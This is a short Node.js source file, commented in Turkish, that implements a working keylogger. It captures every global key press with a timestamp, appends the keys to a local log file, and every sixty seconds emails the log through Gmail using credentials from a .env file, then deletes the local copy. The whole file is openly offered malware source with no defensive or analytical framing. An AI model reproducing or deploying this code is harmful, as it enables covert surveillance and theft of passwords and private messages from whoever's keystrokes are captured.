require("dotenv").config();  // .env dosyasını yükle
const { GlobalKeyboardListener } = require("node-global-key-listener");
const fs = require("fs");
const nodemailer = require("nodemailer");

const logFile = "logs.txt";
const emailInterval = 60000; // 60 saniyede bir e-posta ile gönder

const vKey = new GlobalKeyboardListener();

// 📌 Gmail için transporter (Artık şifre kod içinde görünmüyor!)
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,  // .env dosyasından alıyor
        pass: process.env.EMAIL_PASS   // Şifre artık kodda değil!
    }
});

vKey.addListener((e) => {
    if (e.state === "DOWN") {  // Tekrar etmeyi engelle
        const logEntry = `${new Date().toISOString()} - Key: ${e.name}\n`;
        fs.appendFileSync(logFile, logEntry);
        console.log(logEntry);
    }
});

// 📌 Logları belirli aralıklarla e-posta ile gönder
function sendEmailLogs() {
    if (fs.existsSync(logFile)) {
        const logData = fs.readFileSync(logFile, "utf8");

        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: "🔑 Yeni Keylogger Logları",
            text: logData
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log("❌ E-posta gönderme başarısız: ", error);
            } else {
                console.log("✅ Loglar e-posta ile gönderildi: " + info.response);
                fs.unlinkSync(logFile); // Logları temizle
            }
        });
    }
}

// 📌 Belirli aralıklarla logları gönder
setInterval(sendEmailLogs, emailInterval);

console.log("🎯 Keylogger çalışıyor... Loglar e-posta ile gönderilecek.");
